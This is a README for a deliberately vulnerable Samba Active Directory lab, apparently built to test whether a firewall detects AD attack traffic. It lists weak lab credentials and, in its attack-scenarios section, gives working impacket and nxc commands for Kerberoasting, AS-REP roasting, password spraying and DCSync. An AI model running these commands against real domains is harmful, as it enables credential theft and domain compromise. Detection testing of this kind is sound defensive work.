# 🔴 AD LAB — Active Directory (Samba DC)

> ⚠️ Intentionally-vulnerable **Samba Active Directory** domain controller.
> **Isolated environment only.** Built to test whether **Sangfor NGAF (IPS/IDS)**
> detects/blocks **AD attack traffic** — Kerberoasting, AS-REP roasting, password
> spraying, DCSync, and Zerologon.

The third lab in the set (web → `vuln-lab`, network → `simulation-network`,
**AD → `ad-lab`**). It's the `dc01.corp.local` the `simulation-network` SNMP
breadcrumb points at.

---

## What it is

A single container runs a **Samba AD DC** for realm **`CORP.LOCAL`** (NetBIOS
`CORP`, host `dc01`). It's provisioned fresh on every start (deterministic) with
deliberately weak accounts. The point isn't to fully compromise AD — it's to
**generate the on-the-wire attack signatures** (Kerberos AS/TGS, LDAP, DRSUAPI,
Netlogon) and see what the firewall in front lets through vs. blocks.

## Accounts (all weak on purpose)

| Account | Password | Purpose |
|---|---|---|
| `administrator` | `P@ssw0rd2024!` | Domain Admin |
| `svc_adm` | `P@ssw0rd2024!` | Domain Admin — used for **DCSync** |
| `svc_sql` | `Summer2024!` | SPN `MSSQLSvc/dc01.corp.local:1433` — **Kerberoast** |
| `svc_web` | `Password1` | SPN `HTTP/dc01.corp.local` — **Kerberoast** |
| `j.doe` | `Welcome1` | Pre-auth disabled — **AS-REP roast** |
| `a.admin`…`f.frost` | `Spring2024!` | **Password spray** targets |

Weak password policy (complexity off, min length 1) so the creds are crackable
and sprayable.

---

## Deploy

```bash
docker compose up -d --build
docker compose logs -f ad-target      # watch provisioning + "AD LAB READY"
```

First boot provisions the domain (~30–60s). Verify from Kali:

```bash
# LDAP is up
ldapsearch -x -H ldap://localhost -b "DC=corp,DC=local" -s base 2>/dev/null | head

# SMB is up
smbclient -L //localhost -U 'CORP\administrator%P@ssw0rd2024!' 2>/dev/null

# Kerberos pre-auth check (needs impacket / nxc)
nxc smb localhost -u administrator -p 'P@ssw0rd2024!'
```

## Ports

| Port(s) | Service | Used by |
|---|---|---|
| 88 (tcp/udp) | Kerberos | Kerberoast, AS-REP, spray |
| 389 / 636 / 3268 | LDAP / LDAPS / GC | enum, spray |
| 445 / 139 | SMB | spray, DCSync target |
| 135 + **49152-49180** | RPC epmapper + pinned range | DCSync (DRSUAPI), Zerologon (Netlogon) |
| 464 (tcp/udp) | kpasswd | — |

The RPC dynamic range is pinned (`rpc server dynamic port range`) so DRSUAPI /
Netlogon are reachable on mapped ports rather than random high ones.

---

## Attack scenarios (test Sangfor detection)

These are driven by the `vulnapp-automation` AD modules (`ad-kerberoast`,
`ad-asrep`, `ad-spray`, `ad-dcsync`, `ad-zerologon`), or by hand:

```bash
# Kerberoasting — request TGS for SPN accounts (RC4 on :88 is the signature)
impacket-GetUserSPNs -dc-ip <dc> CORP.LOCAL/j.doe:Welcome1 -request

# AS-REP roasting — users without pre-auth
impacket-GetNPUsers -dc-ip <dc> CORP.LOCAL/ -usersfile users.txt -no-pass

# Password spraying
nxc smb <dc> -u users.txt -p 'Spring2024!' --continue-on-success

# DCSync — replicate secrets (DRSUAPI GetNCChanges from a non-DC = the signature)
impacket-secretsdump -dc-ip <dc> CORP.LOCAL/svc_adm:'P@ssw0rd2024!'@<dc> -just-dc

# Zerologon (CVE-2020-1472) — Netlogon ServerAuthenticate flood (signature test)
```

The interesting question each time: did the signature traffic **reach the DC**
(firewall let it through) or get **blocked**?

---

## Cleanup

```bash
docker compose down
docker rmi ad-lab-ad-target
```

*For authorized learning & security testing only.*
